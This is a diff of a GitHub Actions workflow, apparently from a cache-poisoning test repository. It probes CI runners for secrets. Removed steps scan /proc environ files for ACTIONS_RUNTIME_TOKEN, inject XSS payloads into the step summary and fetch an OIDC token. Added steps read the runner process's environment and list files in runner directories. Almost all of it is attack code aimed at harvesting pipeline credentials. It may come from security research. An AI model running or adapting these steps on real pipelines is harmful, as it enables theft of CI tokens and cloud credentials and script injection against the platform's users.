@@ -8,36 +8,31 @@ permissions:
 jobs:
   run:
     runs-on: ubuntu-latest
-    if: contains(github.event.head_commit.message, 'PROC-PROBE')
+    if: contains(github.event.head_commit.message, 'PROC-V2')
     steps:
-      - name: Read runtime token from proc
+      - name: Find runner process and check environ
         run: |
-          echo "=== PROCESS TREE ==="
-          ps aux | head -15
+          echo "=== FULL PROCESS LIST ==="
+          ps aux | sort -k2 -n | tail -30
           echo ""
-          echo "=== SCAN /proc FOR ACTIONS_RUNTIME_TOKEN ==="
-          for f in /proc/[0-9]*/environ; do
-            v=$(strings "$f" 2>/dev/null | grep "ACTIONS_RUNTIME_TOKEN")
-            if [ -n "$v" ]; then
-              echo "FOUND in $f:"
-              echo "$v" | head -c 200
-              echo ""
-              strings "$f" 2>/dev/null | grep "ACTIONS_RUNTIME_URL" | head -c 200
-              strings "$f" 2>/dev/null | grep "ACTIONS_CACHE_URL" | head -c 200
-              strings "$f" 2>/dev/null | grep "ACTIONS_RESULTS_URL" | head -c 200
+          echo "=== PPID AND CAN WE READ IT? ==="
+          echo "PPID: $PPID"
+          ls -la /proc/$PPID/ 2>/dev/null | head -5
+          echo ""
+          echo "=== PARENT ENVIRON (ACTIONS_ vars) ==="
+          strings /proc/$PPID/environ 2>/dev/null | grep "ACTIONS_" || echo "cannot read parent environ"
+          echo ""
+          echo "=== FIND RUNNER PROCESS ==="
+          for f in /proc/[0-9]*/cmdline; do
+            cmd=$(strings "$f" 2>/dev/null | head -1)
+            if echo "$cmd" | grep -qi "runner\|Runner"; then
+              pid=$(echo "$f" | grep -oP '\d+')
+              echo "Runner PID: $pid CMD: $cmd"
+              echo "  Environ ACTIONS_ vars:"
+              strings /proc/$pid/environ 2>/dev/null | grep "ACTIONS_" || echo "  (cannot read)"
             fi
           done
-          echo "(scan complete)"
           echo ""
-          echo "=== PARENT ENVIRON via strings ==="
-          strings /proc/$PPID/environ 2>/dev/null | grep "ACTIONS_" | sort
-      - name: Step summary XSS
-        run: |
-          echo "<script>document.title='XSS-FIRED'</script>" >> "$GITHUB_STEP_SUMMARY"
-          echo "<img src=x onerror=alert(document.domain)>" >> "$GITHUB_STEP_SUMMARY"
-          echo "<svg onload=alert(1)><rect/></svg>" >> "$GITHUB_STEP_SUMMARY"
-          echo "Summary URL: https://github.com/dannyggg3/cache-poison-test/actions/runs/$GITHUB_RUN_ID"
-      - name: OIDC claims
-        run: |
-          T=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value')
-          echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); [print(k+': '+str(v)) for k,v in sorted(d.items())]"
+          echo "=== FIND FILES IN RUNNER WORK DIR ==="
+          find /home/runner /tmp -name "*.json" -newer /proc/1/comm 2>/dev/null | head -20
+          find /home/runner -type f 2>/dev/null | head -30
